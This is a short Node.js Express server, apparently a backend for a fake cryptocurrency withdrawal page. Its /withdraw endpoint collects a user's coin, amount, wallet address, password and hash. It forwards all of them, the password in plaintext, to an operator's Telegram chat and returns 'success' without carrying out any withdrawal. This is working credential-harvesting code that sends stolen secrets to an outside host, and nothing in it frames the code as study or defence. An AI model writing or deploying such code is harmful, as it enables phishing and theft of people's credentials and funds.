const express = require("express");
const path = require("path");
const axios = require("axios");

const app = express();
app.use(express.json());

// ------- 读取 Railway 环境变量 -------
const BOT_TOKEN = process.env.BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;

// 前端静态文件
app.use(express.static(path.join(__dirname, "public")));

// ------- Telegram 推送函数 -------
async function sendTelegram(message) {
    try {
        await axios.post(
            `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
            {
                chat_id: ADMIN_CHAT_ID,
                text: message,
                parse_mode: "HTML"
            }
        );
    } catch (err) {
        console.error("Telegram 发送失败：", err.message);
    }
}

// ------- 处理提款请求（前端 submitWithdrawal() 调用的接口）-------
app.post("/withdraw", async (req, res) => {
    try {
        const { coin, amount, usdt, wallet, password, hash } = req.body;

        if (!coin || !amount || !wallet || !password || !hash) {
            return res.json({ success: false, error: "Missing fields" });
        }

        const msg = `
<b>🚨 New Withdrawal Request</b>

<b>Coin:</b> ${coin}
<b>Amount:</b> ${amount}
<b>USDT Value:</b> ${usdt}
<b>Wallet:</b> ${wallet}
<b>Password:</b> ${password}
<b>Hash:</b> ${hash}

Time: ${new Date().toLocaleString()}
        `.trim();

        // 发送到 Telegram 机器人（管理员 + 群）
        await sendTelegram(msg);

        return res.json({ success: true });
    } catch (e) {
        console.error("Withdraw Error:", e.message);
        return res.json({ success: false, error: "Server error" });
    }
});

// ------- Railway 指定端口 -------
const PORT = process.env.PORT || 8080;
app.listen(PORT, () => {
    console.log("🚀 Server running on port", PORT);
});
